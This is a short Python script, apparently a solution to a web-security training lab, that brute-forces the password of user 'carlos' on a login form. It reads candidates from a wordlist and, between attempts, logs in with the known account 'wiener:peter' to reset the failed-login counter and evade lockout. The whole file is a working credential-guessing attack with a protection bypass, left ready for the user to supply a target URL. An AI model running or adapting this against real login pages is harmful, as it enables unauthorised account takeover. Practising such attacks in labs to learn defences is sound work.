#change the Url according to yours.
#change your file path which contain passwords

import requests
import random

url = " " #Change this

#username=carlos&password=§admin§

fd = open("passwords.txt",'r') #change your file path which contain passwords
word = fd.read()
fd.close()

passwords = list(word.split('\n'))
counter = 0
for password in passwords:
  if counter == 1:
    data1 = {
      "username":"wiener",
      "password":"peter"
    }
    r = requests.post(url,data=data1)
    counter = 0
  data2={
    "username":"carlos",
    "password":password
  }
  r = requests.post(url,data=data2)
  counter += 1
  print("Trying this {} for Carlos".format(password))
  if "Incorrect password" not in r.text:
	  print(" {}".format(password))

